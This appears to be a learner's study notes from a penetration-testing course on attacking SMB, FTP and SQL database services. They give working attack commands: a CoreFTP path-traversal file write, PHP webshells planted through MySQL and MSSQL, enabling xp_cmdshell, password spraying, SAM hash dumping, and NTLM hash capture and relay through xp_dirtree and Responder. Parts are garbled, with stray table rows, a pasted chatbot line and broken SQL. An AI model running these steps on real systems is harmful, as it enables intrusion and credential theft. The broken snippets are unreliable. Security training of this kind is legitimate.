\\Interacting with COmmon Services
Vulnerabilities are commonly discovered by people who use and understand technology, a protocol, or a service. As we evolve in this field, we will find different services to interact with, and we will need to evolve and learn new technology constantly.

To be successful at attacking a service, we need to know its purpose, how to interact with it, what tools we can use, and what we can do with it. This section will focus on common services and how we can interact with them.
\\File Share Services
\\Server Message Block (SMB)
\\Windows \\192.168.1.1\share
Windows has two command-line shells: the Command shell and PowerShell. Each shell is a software program that provides direct communication between us and the operating system or application, providing an environment to automate IT operations.
\\Windows CMC-Director
The command net use connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter n.
\\Window CMD - Net use
$>net use n: \\192.168.1.1\share
$>net use n: \\192.168.1.1\share /user:plaintext Password123
With the shared folder mapped as the n drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
\\Window CMD - Dir 
$dir n: /a-d /s /b | find /c ":\"
Syntax	Description
dir	Application
n:	Directory or drive to search
/a-d	/a is the attribute and -d means not directories
/s	Displays files in a specified directory and all subdirectories
/b	Uses bare format (no heading information or summary)
$dir n:\*cred* /s /b 
n:\Contracts\private\credentials/txt
$dir n:\*secret* /s /b n:\Contracts\private\secret.txt
-If we want to search for a specific word within a text file, we can use findstr.
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr

\\Windows CMD - Findstr
$findstr /s /i cred n:\*.*

\\Windows Powershell
PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called cmdlets. 
-Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets. Let's replicate the same commands now using Powershell.

\\Windows PowerShell 
$Get-ChildItem \\192.168.1.1\Share\
-instead of net use we can use New-PSDrive in PowerShell
$New-PSDrive -Name "N" -Root "\\192.168.1.1\share" -PSProvider "FileSystem"
To provide a username and password with Powershell, we need to create a PSCredential object. It offers a centralized way to manage usernames, passwords, and credentials.
https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.4.0

\\Windows PowerShell - PSCredential Object
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
$New-PSDrive -Name "N" -Root "\\192.168.1.1\share" -PSProvider "FileSystem" - Credential $cred
We can use the property -Include to find specific items from the directory specified by the Path parameter.

$Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
-The Select-String cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use Select-String similar to grep in UNIX or findstr.exe in Windows.

\\Windows PowerShell - Select-String
$Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -list
CLI enables IT operations to automate routine tasks like user account management, nightly backups, or interaction with many files. We can perform operations more efficiently by using scripts than the user interface or GUI.

\\Linux
Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.

\\Linux-Mount
$sudo mkdir /mnt/Finance
$sudo mkdir /mount -t cifs -o username=plaintext,password=Password123,domain=.//192.168.1.1/finance /mnt/Finance
<alternative>
$mount -t cifs //192.168.1.1/Finance /mnt/Finance -o credentials=/path/credentialsfile
CredentialFile
Code: txt
username=plaintext
password=Password123
domain=.
Note: We need to install cifs-utils to connect to an SMB share folder. To install it we can execute from the command line sudo apt install cifs-utils.
-Once a shared folder is mounted, you can use common Linux tools such as find or grep to interact with the file structure. Let's hunt for a filename that contains the string cred:
\\Linux-Find
$find /mnt/Finance/ -name *cred*
$grep -rn /mnt/Finance/ -ie cred
\\Other service
FTP,TFTP,NFS that we can attach (mount) 
There are other file-sharing services such as FTP, TFTP, and NFS that we can attach (mount) using different tools and commands. However, once we mount a file-sharing service, we must understand that we can use the available tools in Linux or Windows to interact with files and directories. As we discover new file-sharing services, we will need to investigate how they work and what tools we can use to interact with them.

\\email 
SMNP delivery email through internet 
likewise protocol must be retrive an email from a service, POP3 and IMAP
We can use a mail client such as Evolution, the official personal information manager, and mail client for the GNOME Desktop Environment. We can interact with an email server to send or receive messages with a mail client. To install Evolution, we can use the following command:

\\Linux Install Evolution
$sudo apt-get install Evolution
Note: If an error appears when starting evolution indicating "bwrap: Can't create file at ...", use this command to start evolution export WEBKIT_FORCE_SANDBOX=0 && evolution.

\\Video - Connecting to IMAP and SMTP using Evolution
We can use the domain name or IP address of the mail server. If the server uses SMTPS or IMAPS, we'll need the appropriate encryption method (TLS on a dedicated port or STARTTLS after connecting). We can use the Check for Supported Types option under authentication to confirm if the server supports our selected method.

\\\Databases
Databases are typically used in enterprises, and most companies use them to store and manage information. There are different types of databases, such as Hierarchical databases, NoSQL (or non-relational) databases, and SQL relational databases. We will focus on SQL relational databases and the two most common relational databases called MySQL & MSSQL. We have three common ways to interact with databases:
1.	Command Line Utilities (mysql or sqsh)
2.	Programming Languages
3.	A GUI application to interact with databases such as HeidiSQL, MySQL Workbench, or SQL Server Management Studio.
\\Command Line Utilities
To interact with MSSQL (Microsoft SQL Server) with Linux we can use sqsh or sqlcmd if you are using Windows. Sqsh is much more than a friendly prompt. It is intended to provide much of the functionality provided by a command shell, such as variables, aliasing, redirection, pipes, back-grounding, job control, history, command substitution, and dynamic configuration. We can start an interactive SQL session as follows:

\\Linux - SQSH 
$sqsh -S 10.129.20.13 -U username -P Password123
The sqlcmd utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:
At the command prompt.
In Query Editor in SQLCMD mode.
In a Windows script file.
In an operating system (Cmd.exe) job step of a SQL Server Agent job.

\\Window -SQL CMD
$>sqlcmd -S 10.129.20.23 -U username -P password

\\MySQL 
To interact with MySQL, we can use MySQL binaries for Linux (mysql) or Windows (mysql.exe). MySQL comes pre-installed on some Linux distributions, but we can install MySQL binaries for Linux or Windows using this guide. Start an interactive SQL Session using Linux:
\\Linux Mysql
[!bash!]$ mysql -u username -pPassword123 -h 10.129.20.13
GUI Application
To install dbeaver using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases and execute the following command:
Install dbeaver
[!bash!]$ sudo dpkg -i dbeaver-<version>.deb
Run dbeaver
[!bash!]$ dbeaver &
To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).

General TroubleshootingSome reasons why we may not have access to a resource:

Authentication
Privileges
Network Connection
Firewall Rules
Protocol Support

\\The Concept of Attacks
Source --> process --> privileges --> Destination
The concept is based on four categories that occur for each vulnerability. First, we have a Source that performs the specific request to a Process where the vulnerability gets triggered. Each process has a specific set of Privileges with which it is executed. Each process has a task with a specific goal or Destination to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.
\\Source
We can generalize Source as a source of information used for the specific task of a process
code , Libraries, Config , APIs, User input
\Log4j CVE-2021-44228 which was published at the end of 2021
\\process
The Process is about processing the information forwarded from the source. 
PID, Input, Data processing, Variables, logging
\\Log4j 
The process of Log4j is to log the User-Agent as a string using a function and store it in the designated location. T

\\Privileges
Privileges are present in any system that controls processes. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. 
-What made the Log4j vulnerability so dangerous was the Privileges that the implementation brought. Logs are often considered sensitive because they can contain data about the service, the system itself, or even customers
system, user, groups, policies, Rule
\\Destination
Every task has at least one purpose and goal that must be fulfilled. Logically, if any data set changes were missing or not stored or forwarded anywhere, the task would be generally unnecessary.
local, Network

The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the Destination in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (RCE) vulnerability.

\\===========================================
Service Misconfigurations
\\Authentication
-Anonymous Authentication
-Misconfigured Access Right
Administrators need to plan their access rights strategy, and there are some alternatives such as Role-based access control (RBAC), Access control lists (ACL). If we want more detailed pros and cons of each method, we can read Choosing the best access control strategy by Warren Parad from Authress.
-Unnecessary Defaults
Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
Default accounts and their passwords are still enabled and unchanged.
Error handling reveals stack traces or other overly informative error messages to users.
For upgraded systems, the latest security features are disabled or not configured securely.
\\Preventing Misconfiguration 
Admin interfaces should be disabled.
Debugging is turned off.
Disable the use of default usernames and passwords.
Set up the server to prevent unauthorized access, directory listing, and other issues.
Run scans and audits regularly to help discover future misconfigurations or missing fixes.

-The OWASP Top 10 provides a section on how to secure the installation processes:

A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. In addition, this process should be automated to minimize the effort required to set up a new secure environment.

A minimal platform without unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.

A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see A06:2021-Vulnerable and Outdated Components). Review cloud storage permissions (e.g., S3 bucket permissions).

A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).

Sending security directives to clients, e.g., security headers.

An automated process to verify the effectiveness of the configurations and settings in all environments.

\\\\\==========================================
Finding Sensitive information
When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is essential.

\\\\\======================================
Attacking FTP
The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listing files, and renaming and deleting directories or files. By default, FTP listens on port TCP/21.
To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities.
\\Enumeration
$sudo nmap -sC -sV -p 21 192.168.2.142
-sC nmap scrip -sV version enum banner m,,
\\Misconfigurations
 To access with anonymous login, we can use the anonymous username and no password. 
\\Anonymous Authentication
$ftp 192.168.2.142
ls cd get mget, upload put mput 
\\Protocol Specifics Attacks
Many different attacks and methods are protocol-based. However, it is essential to note that we are not attacking the individual protocols themselves but the services that use them. Since there are dozens of services for a single protocol and they process the corresponding information differently, we will look at some.
\\Bruteforcing 
Note: Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.
$medusa -u <username> -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
\\FTP Bounce Attack
An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.
-Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.
 https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/
 $nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
 -b can be used to perform an FTP bounce aattack

 <test>
hydra -t 45 -L users.list -P passwords.list ssh://<ip> -q 
\\Lastest FTP vulnerabilities
In this case, we will discuss the CoreFTP before build 727 vulnerability assigned CVE-2022-22836. This vulnerability is for an FTP service that does not correctly process the HTTP PUT request and leads to an authenticated directory/path traversal, and arbitrary file write vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.
\\The Concept of the Attack
This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. Let's have a look at the attack based on our concept. The exploit for this attack is relatively straightforward, based on a single cURL command.
https://www.exploit-db.com/exploits/50652

\\CoreFTP Exploitation
$curl -k -X PUT -H "Host: <ip>" --basic -u <username>:<password> --data-binary "Poc." --path-as-is https://<IP>/../../../../../../whoops
We create a raw HTTP PUT request (-X PUT) with basic auth (--basic -u <username>:<password>), the path for the file (--path-as-is https://<IP>/../../../../../whoops), and its content (--data-binary "PoC.") with this command. Additionally, we specify the host header (-H "Host: <IP>") with the IP address of our target system.
\\The Concept of Attacks
In short, the actual process misinterprets the user's input of the path. This leads to access to the restricted folder being bypassed. As a result, the write permissions on the HTTP PUT request are not adequately controlled, which leads to us being able to create the files we want outside of the authorized folders. However, we will skip the explanation of the Basic Auth process and jump directly to the first part of the exploit.

Directory Traversal
Step	Directory Traversal	Concept of Attacks - Category
1.	The user specifies the type of HTTP request with the file's content, including escaping characters to break out of the restricted area.	Source
2.	The changed type of HTTP request, file contents, and path entered by the user are taken over and processed by the process.	Process
3.	The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal.	Privileges
4.	The destination is another process that has the task of writing the specified contents of the user on the local system.	Destination

Up to this point, we have bypassed the constraints imposed by the application using the escape characters (../../../../) and come to the second part, where the process writes the contents we specify to a file of our choice. This is when the cycle starts all over again, but this time to write contents to the target system.

Arbitrary File Write
Step	Arbitrary File Write	Concept of Attacks - Category
5.	The same information that the user entered is used as the source. In this case, the filename (whoops) and the contents (--data-binary "PoC.").	Source
6.	The process takes the specified information and proceeds to write the desired content to the specified file.	Process
7.	Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file.	Privileges
8.	The filename specified by the user (whoops) with the desired content ("PoC.") now serves as the destination on the local system.	Destination

\\Attacking SMB
MB is a protocol for sharing files and printers over networks. It uses port 445 (direct TCP/IP) or 139 
(via NetBIOS). Samba is the Linux/Unix open-source version enabling SMB sharing with Windows.
-MSRPC (Microsoft RPC) lets programs call functions remotely; MS-RPCE defines RPC-over-SMB using SMB named pipes.
Attacking SMB requires knowing the server/OS and tools; common paths are misconfiguration, excessive privileges, and vulnerabilities.
After access, inspect shared folders and enumerate NetBIOS/RPC info (shares, pipes, privileges).

\\Enumeration
Nmap output varies by SMB implementation and OS — Windows often won’t show exact version (Nmap only guesses). You’ll usually need additional scans to confirm vulnerabilities; for now scan TCP ports 139 and 445 (example: nmap -sV -p 139,445 <target>).
$sudo nmap 10.129.14.128 -sV -sC -P139,445
-The Nmap scan reveals essential information about the target:
SMB version (Samba smbd 4.6.2)
Hostname HTB
Operating System is Linux based on SMB implementation
-Let's explore some common misconfigurations and protocols specifics attacks.
\\Misconfigurations
SMB can be configured not to require authentication, which is often called a null session. Instead, we can log in to a system with no username or password.

\\Anonymous Authentication
If an SMB server allows anonymous access or we have valid creds, we can enumerate shares, users, groups, permissions, policies, and services.
 Tools that support null sessions include smbclient, smbmap, rpcclient, and enum4linux. Next: interact with file shares and RPC using null authentication.

\\File Share
Using smbclient, we can display a list of the server's shares with the option -L, and using the option -N, we tell smbclient to use the null session.
$smbclient -N -L //10.129.14.128

Smbmap is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder.
$smbmap -H 10.129.14.128
$smbmap -r or -R (recursive) option, 
$smbmap -H 10.129.14.128 -r notes
The permis are set to READ and Write which one can use to upload and download the files
$smbmap -H 10.129.14.128 --download "note\note.txt"
$smbmap -H 10.129.14.128 --upload test.txt "note\test.txt"

\\Remote Procedure call (RPC)
We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller.
The rpcclient tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this cheat sheet from the SANS Institute or review the complete list of all these functions found on the man page of the rpcclient.
https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
$rpcclient -U'%' 10.129.110.17
>enumdomousers
-Enum4linux is another utility that supports null sessions, and it utilizes nmblookup, net, rpcclient, and smbclient to automate some common enumeration from SMB targets such as:
Workgroup/Domain name
Users information
Operating system information
Groups information
Shares Folders
Password policy information
-the origin tool was written in perl and rewritten by Mark love in python2

7.	The same privileges of the SMB server are used.	Privileges
8.	The remote attacker system is used as the destination, in this case, granting access to the local system.	Destination
However, despite the vulnerability's complexity due to the buffer's manipulation, which we can see in the PoC, the concept of the attack nevertheless applies here.



\\Protocol Specifics Attacks\
If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are brute forcing and password spraying.
\
\\Brute Forcing and Password Spray
Brute-force tries many passwords for one account but risks lockouts — avoid it unless you know the lockout threshold.
Password spraying is safer: try a common password across many usernames (2–3 guesses per account is typical), wait ~30–60 minutes between rounds.
CrackMapExec supports spraying: e.g. cme smb <target> -u users.txt -p 'Password1' (tries Password1 for every user in users.txt).
$crackmapexec smb 10.l0.110.17 -u /tmp/usrlist.txt -p 'Company01!' --local-auth
 we can use the option -u to specify a file with a user list and -p to specify a password. This will attempt to authenticate every user from the list using the provided password.
 By default CME stops after a successful login; add --continue-on-success to keep spraying the same password across the list.
For non-domain (local) targets use --local-auth.
Example: cme smb <target> -u users.txt -p 'Password1' --continue-on-success
For deeper study, see the Active Directory Enumeration & Attacks module.
\\SMB
Linux SMB mainly exposes filesystem-level attacks and privilege abuse, while Windows SMB has a larger attack surface.
On Windows, what you can do depends on the compromised account’s privileges — with admin-level access you can run remote commands, extract SAM hashes, enumerate logged-on users, and perform Pass-the-Hash.
We’ll cover techniques to perform these actions and how SMB can be abused to retrieve user hashes for escalation.

\\Remote Code Execution (RCE)
PsExec is a Sysinternals tool for running interactive processes on remote Windows machines: it copies a service to the admin$ share, uses DCE/RPC over SMB to talk to the Service Control Manager, starts the service, and opens a named pipe to send commands. You can download PsExec from Microsoft or use Linux equivalents.
-Impacket PsExec - Python PsExec like functionality example using RemComSvc.
Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
CrackMapExec - includes an implementation of smbexec and atexec.
Metasploit PsExec - Ruby PsExec implementation.

\\Impacket PsExec
To use impacket-psexec, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:
$impacket-psexec -h 
To connect to a remote machine with a local administrator account, using impacket-psexec, you can use the following command:
$impacket-psexec administrator:'Password123!'@10.10.110.17
>whoami && hostname 
The same options apply to impacket-smbexec and impacket-atexec.

\\CrackMapExec
CrackMapExec can run commands on multiple hosts at once. Example:
cme smb <targets> -u users.txt -p 'Passw0rd' -x 'whoami' (CMD) or -X 'Get-Process' (PowerShell).
$crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

Note: If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec

\\Enumerating Logged-on Users
Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.17/24, which speeds up our enumeration process.
$crackmapexec smb 10.10.110.9/24 -u Administrator -p 'Password123!' --loggedon-users

\\Extract Hashes from SAM database
The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:
Authenticate as another user.
Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
Pass The Hash. We will discuss it later in this section.
$crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam 

\\Pass-the-Hash (PtH)
If you get a user's NTLM hash but can't crack it, you can still authenticate via Pass-the-Hash (PtH) — use the hash with tools like Impacket, smbmap, or CrackMapExec to authenticate over SMB.

\\Forced Authentication Attacks
Use a fake SMB server (Responder) to poison LLMNR/NBT-NS/MDNS and capture NetNTLM v1/v2 hashes — Responder replies for requested hosts and logs the hashes.
$responder -I <interface name>
Windows resolves names by checking (1) hosts file, (2) local DNS cache, (3) configured DNS server, 
and if unresolved, (4) sends a multicast (LLMNR/NetBIOS/MDNS) query. A mistyped share (e.g. \\mysharefoder\) triggers that multicast
 — attackers can spoof replies (no integrity checks) and redirect victims to malicious SMB servers to capture credentials.
$sudo responder -I ens33
-These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
-All saved Hashes are located in Responder's logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.
-Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
$hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
NTLMv2 cracked → password: P@ssword. If uncracked, you can relay the captured hash (e.g., with impacket-ntlmrelayx or Responder MultiRelay); set SMB = Off in Responder.conf first.
$cat /etc/responder/Responder.conf | grep 'SMB='
-Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
$impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
-We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).

\\\RPC
In the Footprinting module, we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:

Change a user's password.
Create a new domain user.
Create a new shared folder.
We also cover enumeration using RPC in the Active Directory Enumeration & Attacks module.
Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the rpclient man page or SMB Access from Linux Cheat Sheet from the SANS Institute to explore this further.

\\Authentication Mechanisms
Authentication Type	Description
Windows authentication mode	This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
Mixed mode	Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.
-in the past it have CVE-2012-2122 in MySQL 5.6.x servers, allow bypass authen by repeadly using the same incorrect password for the given account because the timing attack vul existed in the way MySQL handled authen attempts

\\protocol specific attack
It is crucial to understand how SQL syntax works. We can use the free SQL Injection Fundamentals module to introduce ourselves to SQL syntax. Even though this module covers MySQL, MSSQL and MySQL syntax are pretty similar.
\\Read/Change the Databases
First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that we may find databases with hundreds of tables. If our goal is not just getting access to the data, we will need to pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations, and more. Let's see how we can do this:
\\MySQL - Connecting to the SQL Server
$mysql -u julio -pPassword12 -h 10.129.20.13
\\Sqlcmd - Connecting to the SQL Server
$sqlcmd -S SRVMSSQL -U julio -P 'Mypassword' -y 30 -Y 30
Note: When we authenticate to MSSQL using sqlcmd we can use the parameters -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
$sqsh -S 10.129.203.7 -U julio -P 'Passwordp' -H
<alter>
$mssqlclient.py -p 1433 julio@10.129.203.7
-Note: When we authenticate to MSSQL using sqsh we can use the parameters -h to disable headers and footers for a cleaner look.
-we can use SERVERNAME\\accountname or .\\accountname. The full command would look like:
$sqsh -S 10.129.203.7 -U .\\julio -P 'Mypassword!' -H

\\SQL Default Databases
Before using SQL, know the default MySQL and MSSQL databases — they store system info (names, tables, columns) and support enumeration, but rarely contain company data.
Note: We will get an error if we try to list or connect to a database we don't have permissions to.
-MySQL default system schemas/databases:
    mysql - is the system database that contains tables that store information required by the MySQL server
information_schema - provides access to database metadata
performance_schema - is a feature for monitoring MySQL Server execution at a low level
sys - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

-MSSQL default system schemas/databases:

    master - keeps the information for an instance of SQL Server.
msdb - used by SQL Server Agent.
model - a template database copied for each new database.
resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
tempdb - keeps temporary objects for SQL queries.

\\SQL Syntax
Show Databases
mysql>SHOW DATABASES;
If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
$SELECT name FROM master.dbo.sysdatabases
$GO
\\Select a database
mysql>USE htbusers;  >GO
\\Show tables
mysql>SHOW TABLES;
$SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES  > GO
\\Select all Data from Table "users"
mysql>SELECT * FROM users; > GO
\\Execute commands
-Command execution lets attackers control the OS. With sufficient privileges SQL can run system commands. MSSQL’s xp_cmdshell does this — powerful and disabled by default (enable via Policy-Based Management or sp_configure), runs as the SQL Server service account, and is synchronous.
Example: EXEC xp_cmdshell 'whoami';
\\xp_cmdshell
1>xp_cmdshell 'whoami'  2>GO
-If xp_cmdshell is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
$mssql>EXECUTE sp_configure 'show advanced options', 1 >GO
$RECONFIGURE >GO 
$EXECUTE sp_configure 'xp_cmdshell', 1 >GO
$RECONFIGURE  >GO

-Other ways to get command execution include extended stored procedures, CLR assemblies, SQL Server Agent jobs, external scripts, and registry tweaks like xp_regwrite (privilege escalation) — out of scope here.
MySQL UDFs can run C/C++ (a command-exec UDF exists on GitHub); rare in production but possible.

\\Write Local files
MySQL has no xp_cmdshell, but with sufficient privileges you can write an executable file (e.g. via SELECT ... INTO OUTFILE) into a webserver directory (PHP/ASP.NET) and then trigger it to run.
https://mariadb.com/docs/server/reference/sql-statements/data-manipulation/selecting-data/select-into-outfile
$mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
-In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. These operations are permitted only to users who have the FILE privilege.

secure_file_priv may be set as follows:

If empty, the variable has no effect, which is not a secure setting.
If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
If set to NULL, the server disables import and export operations.
\\MySQL- Secure File Privileges
mysql>show variables like "secure_file_priv";
-To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
\\MSSQL - Enable Ole Automation Procedures
1>sp_configure 'show advanced options', 1 >GO
3>RECONFIGURE >GO
5>sp_configure 'Ole Automation Procedures', 1 >GO
7>RECONFIGURE >GO
\\MSSQL - Create a File
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
\\Read Local files
-By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
Read Local Files in MSSQL
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents  > GO
-As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
\\MySQL - Read Local Files in MySQL
mysql> select LOAD_FILE("/etc/passwd");
\\Capture MSSQL Service Hash
-ChatGPT said:

Point xp_subdirs/xp_dirtree at your SMB listener and MSSQL will authenticate to it, leaking the SQL Server service account’s NTLMv2 hash. Start an SMB responder (e.g., Responder or impacket-smbserver) and run the SQL query to trigger the authentication.
-To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:
\\XP_DIRTREE Hash Stealing
1>EXEC master..xp_dirtree '\\10.10.110.17\share\' 2>GO
\\XP_SUBDIRS Hash Stealing
1>EXEC master..xp_subdirs '\\10.10.110.17\share\' 2>GO
-If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
\\XP_SUBDIRS Hash Stealing with Responder
$sudo responder -I tun0
\\XP_SUBDIRS Hash Stealing with impacket
$sudo impacket-smbserver share ./ -smb2support
\\Impersonate Existing Users with MSSQL
-SQL svr has a special perm name IMPERSONATE, that allow the exec user to take on the perm of another user or login until the context is reset or the session enumdomousers
-First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
\\identify Users that we can impersonate
1>SELECT distinct b.name
2>FROM sys.server_permissions 0
3>INNER JOIN sys.server_pricipals b 
4>ON a.grator_pricipal_id = b.grator_pricipal_id
5>WHERE a.permission_name = 'IMPERSONATE'
6>GO
-To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
\\Verify our Current User and Role
1>SELECT SYSTEM_USER
2>SELECT IS_SRVROLEMEMBER('sysadmin') 3>GO
-Return code 0 = not sysadmin. Impersonate sa with:
EXECUTE AS LOGIN = 'sa';
then run the commands.
\\Impersonating the SA User
1>EXECUTE AS LOGIN = 'sa'
2>SELECT SYSTEM_USER
3>SELECT IS_SRVROLEMEMBER('sysadmin') >GO
-Note: It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.
-We can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement REVERT.
-Note: If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
\\Communicate with Other Databases with MSSQL
-MSSQL linked servers let one DB query another (SQL Server or other DB). If a linked server uses remote credentials with sysadmin rights, you can pivot and run queries/commands on the remote instance — find and test linked servers.
-MSSQL has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
\\identify linked Servers in MSSQL
1>SELECT srvname, isremote FROM sysservers >GO
-https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver17
